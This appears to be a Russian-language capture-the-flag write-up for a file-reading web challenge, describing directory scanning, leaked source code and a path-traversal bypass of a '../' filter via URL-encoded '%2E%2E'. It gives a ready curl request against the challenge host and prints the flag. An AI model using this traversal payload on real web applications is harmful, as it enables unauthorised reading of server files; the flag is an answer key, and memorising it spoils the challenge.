Задача 3 — File reading

Описание

Дано веб-приложение (адрес в условии). Цель — получить флаг, исследуя утекающие исходники и находя уязвимость чтения файлов.

Анализ

1. Сканирование директорий
   - Для поиска скрытых путей удобно использовать dirb или другой web-scanner с common.txt.
   - В результате найдены пути /shop/_source/ и /shop/files/.

2. Исходный код
   - В директории _source находятся исходники приложения. Изучив их, можно заметить логику, которая принимает параметр "file" и читает файл с диска.
   - Часто такое поведение уязвимо к Path Traversal (../) — если приложение недостаточно фильтрует или декодирует входные данные.

3. Фильтры и обход
   - В коде присутствуют простые фильтры, препятствующие прямому использованию "../". Однако обход возможен через URL-encoding: "%2E%2E" — это эквивалент "..".
   - Также может потребоваться повторная кодировка или обход дополнительных проверок, но в данной задаче достаточно использовать %2E%2E/%2E%2E/flag.

Эксплуатация (пример)

Сделать POST-запрос на:

POST /shop/files/
Content-Type: application/x-www-form-urlencoded

Параметры:
file=%2E%2E/%2E%2E/flag

Пример с curl:

curl -s -X POST "http://193.41.142.9:8001/shop/files/" -d "file=%2E%2E/%2E%2E/flag"

Ответ в теле будет содержать флаг.

Флаг

flag{y0u_g0t_0ur_s3cr3t}
